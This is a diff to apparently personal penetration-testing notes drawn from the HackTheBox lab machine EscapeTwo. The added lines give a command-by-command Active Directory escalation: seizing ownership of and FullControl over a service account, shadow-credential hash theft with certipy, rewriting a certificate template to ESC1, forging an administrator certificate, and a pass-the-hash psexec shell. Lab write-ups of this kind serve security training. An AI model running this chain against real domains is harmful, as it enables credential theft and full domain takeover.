@@ -253,12 +253,30 @@ nxc winrm IP -u users.txt -p pass.txt --continue-on-success
 - In the bloodhound, if any object/user has the `WriteOwner` permission, we can own the object
 - Below permissions are referenced from the [HTB-EscapeTwo](https://app.hackthebox.com/machines/EscapeTwo)
 ```sh
-         |----Owns(New Permission)-------------------|
-ryan ----|                                           |-----CA_SVC
-         |-----WriteOwner(Existing Persmission)------|
+                           |----Owns(New Permission)-------------------|
+ryan(Owned with Creds) ----|                                           |-----CA_SVC
+                           |-----WriteOwner(Existing Persmission)------|
 
 ```
 ```bash
 Set-DomainObjectOwner -Identity ca_svc -OwnerIdentity ryan
+```
+- Above is one way to own, just owning the object
+- Another way is
+```bash
+certipy shadow auto -username ryan@sequel.htb -password <PASSWORD> -account ca_svc -dc-ip <IP> # It fails because of the insufficient right to that account
+python3 owneredit.py -action write -new-owner ryan -target ca_svc sequel.htb/ryan:<PASSWORD>   # Now we became the owner of the account
+certipy shadow auto -username ryan@sequel.htb -password <PASSWORD> -account ca_svc -dc-ip <IP> # Again error, even though we are the owner, we don't have the write permission
+python3 dacledit.py -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:<PASSWORD> # .bak file is saved
+certipy shadow auto -username ryan@sequel.htb -password <PASSWORD> -account ca_svc -dc-ip <IP>  # After resetting once and running this command 2 times, it got the correct NTLM hash, crosseched with nxc smb with hash and ca_svc
+```
+- Checking the Active Directory Certificate vulnerabilities
+    - Make this to vulnerable `ESC1` certificate
+```bash
+certipy find -dc-ip <IP> -u ca_svc -hashes <NTLM> -stdout -vuln # FInd the which certificate is vulnerable
+certipy template -dc-ip <IP> -u ca_svc -hashes <NTLM> -template <TEMPLATE_NAME> -write-default-configuration # Make this vulnerable to ESC1
+certipy req -u ca_svc -hashes <NTLM> -ca <CA Name> -template <TEMPLATE_NAME> -upn administrator@sequal.htb -target dc01.sequel.htb -target-ip <IP> # Rerun commands one more time then it's generate the administrator.pfx, if .pfx file is not generate run this few times, If the -vuln command shows the ESC1 vulnerable it generating the .pfx file
+certipy auth -pfx administrator.pfx -dc-ip <IP>
+impacket-psexec -hashes <LM>:<NTLM> administrator@<IP>
 ```
 
